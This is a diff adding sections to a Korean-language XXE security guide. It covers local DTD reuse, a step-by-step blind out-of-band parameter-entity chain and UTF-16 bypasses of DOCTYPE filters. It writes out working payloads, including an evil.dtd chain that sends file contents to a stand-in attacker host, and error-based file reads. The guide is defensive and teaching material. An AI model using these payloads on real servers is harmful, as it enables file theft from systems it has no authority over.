@@ -301,6 +301,62 @@ pip install lxml && python3 xxe_demo.py
 | 아웃바운드 차단 (외부 DTD 불가) | 시스템에 있는 **로컬 DTD**를 불러와 그 안의 파라미터 개체를 재정의 (Arseniy Sharoglazov, 2018). 에러 기반과 결합 |
 | 응답 미반영 + 아웃바운드 차단 | 에러 기반: 존재하지 않는 경로에 파일 내용을 섞어 파서 오류 메시지로 읽기 |
 
+### 7.1 로컬 DTD 재사용: 아웃바운드가 막혔을 때
+
+1절의 blind OOB는 공격자 서버에서 DTD를 받아온다. 아웃바운드가 막힌 서버에서는 그 한 단계가 불가능하다. Arseniy Sharoglazov가 2018년 "Exploiting XXE with local DTD files"에서 보인 기법은 **서버 디스크에 이미 있는 DTD 파일**을 그 자리에 쓴다. XML 규격의 두 규칙이 합쳐진 결과다.
+
+1. **내부 서브셋에서는 파라미터 개체 참조를 마크업 선언 안에 둘 수 없다**(XML 1.0 WFC "PEs in Internal Subset"). 그래서 `<!ENTITY % eval "<!ENTITY &#x25; exfil …%file;…>">`를 요청 본문에 직접 넣으면 파서가 거부한다. JDK 내장 파서의 오류 문구는 "The parameter entity reference "%file;" cannot occur within markup in the internal subset of the DTD"이고, libxml2는 "PEReferences forbidden in internal subset"이다. 이 제한이 **외부 서브셋(외부 DTD 파일)** 안에서는 없다. 1절에서 외부 DTD가 필요했던 이유다.
+2. **같은 이름의 개체가 두 번 선언되면 첫 선언이 유효하다**(XML 1.0 4.2절). 내부 서브셋이 외부 DTD보다 먼저 읽히므로, 내부 서브셋의 선언이 외부 DTD의 같은 이름 선언을 덮는다.
+
+둘을 합치면, 로컬 DTD 파일 안에 "파라미터 개체를 선언하고 곧바로 참조하는" 자리만 있으면 된다. 구조는 다음과 같다.
+
+```xml
+<!DOCTYPE message [
+  <!ENTITY % local_dtd SYSTEM "file:///서버에_있는/어떤.dtd">   <!-- ① 디스크의 DTD. 네트워크 불필요 -->
+  <!ENTITY % 그_DTD가_참조하는_개체이름 '                      <!-- ② 같은 이름을 먼저 선언해 덮어쓴다 -->
+    <!ENTITY &#x25; file SYSTEM "file:///읽을/파일">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///없는경로/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;                                                   <!-- ③ 외부 DTD를 읽는다. 그 안의 %개체이름; 이 ②로 펼쳐진다 -->
+]>
+<message>x</message>
+```
+
+③에서 외부 DTD의 `%개체이름;` 참조를 만나는 순간, 파서는 **외부 서브셋 문맥**에 있고, 펼쳐진 텍스트 ②는 거기서 합법이다. ②의 `&#x25;`는 `%`의 문자 참조다. 선언 시점에 `%`로 바뀌어 저장되고, `%eval;`이 참조될 때 비로소 `%file;`이 펼쳐진다. 결과를 밖으로 보낼 수 없으므로 에러 기반과 결합한다. 존재하지 않는 경로 뒤에 파일 내용을 붙여 열게 하면, 파서 오류 메시지에 그 경로가 그대로 찍힌다. JDK 내장 파서로 실습 환경에서 재현하면 `FileNotFoundException: /없는경로/<파일 첫 줄>`이 나온다.
+
+원 연구의 예는 GNOME 도움말 패키지의 `/usr/share/yelp/dtd/docbookx.dtd`와 그 안의 `ISOamso` 개체다. 어떤 DTD가 있는지는 OS와 설치된 패키지에 달렸고, Java라면 jar 안의 DTD(`jar:file:///…/jsp-api.jar!/…/jspxml.dtd`)도 후보다. GoSecure의 [dtd-finder](https://github.com/GoSecure/dtd-finder)가 알려진 경로와 개체 이름 목록을 관리한다. 파서 의존성도 있다. 같은 문서를 libxml2 2.14(lxml 6.1)에 넣으면 내부 서브셋에서 선언된 개체의 펼침에 내부 서브셋 규칙을 적용해 "PEReferences forbidden in internal subset"으로 거부했다. 따라서 "로컬 DTD가 있다"가 아니라 **"이 파서에서 이 DTD로 펼쳐진다"**까지가 검증이다.
+
+### 7.2 블라인드 OOB: 파라미터 개체 구조를 단계로
+
+1절의 두 파일을 파서가 처리하는 순서대로 다시 읽는다. 각 줄이 왜 그 자리에 있어야 하는지가 핵심이다.
+
+| 단계 | 어디서 | 선언·참조 | 왜 |
+|---|---|---|---|
+| 1 | 요청 본문(내부 서브셋) | `<!ENTITY % ext SYSTEM "http://공격자/evil.dtd">` | 외부 DTD를 가리키는 파라미터 개체. 선언만으로는 아무 일도 없다 |
+| 2 | 요청 본문 | `%ext;` | 내부 서브셋의 **최상위**에서는 파라미터 개체 참조가 허용된다. 파서가 evil.dtd를 받아 그 자리에 펼친다. 아웃바운드 1회 |
+| 3 | evil.dtd | `<!ENTITY % file SYSTEM "file:///etc/hostname">` | 읽을 파일. 값은 아직 읽지 않는다 |
+| 4 | evil.dtd | `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://공격자/?d=%file;'>">` | 선언을 만드는 선언. `&#x25;`는 `%`로 바뀌어 저장되고, `%file;`은 외부 서브셋이므로 **이 선언이 처리될 때** 파일 내용으로 펼쳐진다 |
+| 5 | evil.dtd | `%eval;` | 4의 텍스트가 선언으로 해석된다. 이제 `exfil`의 URI 안에 파일 내용이 들어 있다 |
+| 6 | evil.dtd | `%exfil;` | 그 URI를 연다. 아웃바운드 2회. 공격자 로그에 파일 내용이 남는다 |
+
+이 구조에서 자주 틀리는 세 가지. 첫째, 4를 `%`로 쓰면 그 선언이 처리되는 시점에 `%exfil`을 펼치려 해서 실패한다. 반드시 문자 참조 `&#x25;`다. 둘째, 파일 내용이 URL에 들어가므로 **줄바꿈·공백·`#`이 있으면 URI가 깨진다**. `/etc/passwd` 대신 `/etc/hostname`처럼 한 줄짜리를 고르거나, 6을 `file:///없는경로/%file;`로 바꾼 에러 기반을 쓴다. 에러 기반은 아웃바운드가 없어도 되고(7.1과 결합), 오류 메시지가 응답에 반영될 때만 된다. 셋째, 파서마다 실패를 다루는 방식이 다르다. libxml2는 6에서 URI를 못 열면 `WARNING Can't resolve URI: file:///없는경로/<파일 내용>`을 오류 로그에만 남기고 파싱은 정상 종료한다. 응답에 오류가 안 보인다고 "안 된다"가 아니다. 서버 로그나 OOB 채널을 봐야 한다.
+
+### 7.3 인코딩으로 `<!DOCTYPE` 필터 넘기기
+
+요청 본문에서 `<!DOCTYPE` 문자열을 지우거나 차단하는 WAF·입력 필터는 **바이트**를 본다. XML 파서는 바이트를 보기 전에 **인코딩을 먼저 정한다**. XML 1.0 부록 F는 파서가 문서의 첫 바이트(BOM `FF FE`·`FE FF`, 또는 `3C 00 3F 00` 같은 `<?xml`의 패턴)로 인코딩을 자동 감지하도록 한다. 같은 문서를 UTF-16으로 보내면 `<!DOCTYPE`는 `3C 00 21 00 44 00 …`이 되고, ASCII 부분 문자열 검색은 아무것도 찾지 못한다. 파서는 정상적으로 읽는다. lxml 6.1로 확인하면 다음과 같다.
+
+```python
+doc = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE a [<!ENTITY x "expanded">]><a>&x;</a>'.encode("utf-16")
+b"<!DOCTYPE" in doc                    # False  ← 필터가 보는 것
+etree.fromstring(doc, parser).text     # 'expanded' ← 파서가 하는 것 (resolve_entities=True)
+```
+
+변형은 세 가지다. (1) 선언 없이 BOM만, 또는 BOM 없이 바이트 패턴만으로 UTF-16을 알리는 문서. 둘 다 규격상 감지 대상이다. (2) **외부 DTD의 인코딩**. 외부 개체는 각자 텍스트 선언(`<?xml encoding=…?>`)을 가지므로, 본문은 UTF-8로 깨끗하게 두고 DTD 파일만 다른 인코딩으로 둘 수 있다. 본문만 검사하는 필터는 DTD를 못 본다. (3) UTF-7(`+ADw-!DOCTYPE`). 과거 .NET의 `XmlTextReader` 같은 일부 파서가 지원했고, 현재 주류 파서는 대부분 지원하지 않으므로 대상 파서를 확인한 뒤에만 시도한다. 명령줄에서는 `iconv -f UTF-8 -t UTF-16 doc.xml > doc16.xml`로 만든다.
+
+결론은 6절과 같다. 문자열 필터는 방어가 아니다. 파서 설정으로 DTD를 끄면 인코딩이 무엇이든 `DOCTYPE`에서 파싱이 멈춘다. 점검 보고서에 "`<!DOCTYPE` 필터로 완화함"이라고 적힌 조치는 이 절의 변형 하나로 재검증한다.
+
 ## 8. 실제 CVE 사례
 
 | CVE | 제품 | 핵심 | 패치 |
@@ -342,6 +398,8 @@ pip install lxml && python3 xxe_demo.py
 - [PHP `libxml_disable_entity_loader` 문서](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) · 사용 중단 사유
 - [Microsoft, CA3075: Insecure DTD processing](https://learn.microsoft.com/dotnet/fundamentals/code-analysis/quality-rules/ca3075) · .NET 분석기 규칙과 안전한 코드
 - Arseniy Sharoglazov, "Exploiting XXE with local DTD files" (2018) · 아웃바운드가 막힌 환경의 우회
+- [GoSecure dtd-finder](https://github.com/GoSecure/dtd-finder) · 알려진 로컬 DTD 경로와 재정의 가능한 개체 이름 목록 (7.1절)
+- [XML 1.0 (Fifth Edition)](https://www.w3.org/TR/xml/) · 2.8절 WFC "PEs in Internal Subset", 4.2절 첫 선언 우선, 부록 F 인코딩 자동 감지
 - [PortSwigger Web Security Academy: XXE injection](https://portswigger.net/web-security/xxe) · 4.2절 랩
 
 ## 변경 이력
@@ -351,3 +409,4 @@ pip install lxml && python3 xxe_demo.py
 | 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
 | 2026-10-22 | 10섹션 전체 작성. 언어별 안전 설정 4종, 숨은 XML 입력 표, CVE 4건, lxml 재현 코드 추가 | @anthonynoh5202 |
 | 2026-10-22 | 기술 검증: CVE 4건 레코드 대조(전부 실존; CVE-2019-3773·CVE-2021-23926 영향 버전을 레코드 기준으로 수정). lxml 5.0부터 기본 resolve_entities='internal'로 바뀐 점을 반영해 취약 예제·재현 코드 수정(lxml 6.1·defusedxml 실행 확인). Java JAXP/StAX 설정 문자열 실행 확인 | 검증팀 |
+| 2026-10-22 | 독자 테스트 반영: 7절에 로컬 DTD 재사용 원리(JDK 파서·libxml2 실행 확인), 블라인드 OOB 파라미터 개체 단계표, UTF-16 인코딩 우회 원리(lxml 실행 확인) 추가 | @anthonynoh5202 |
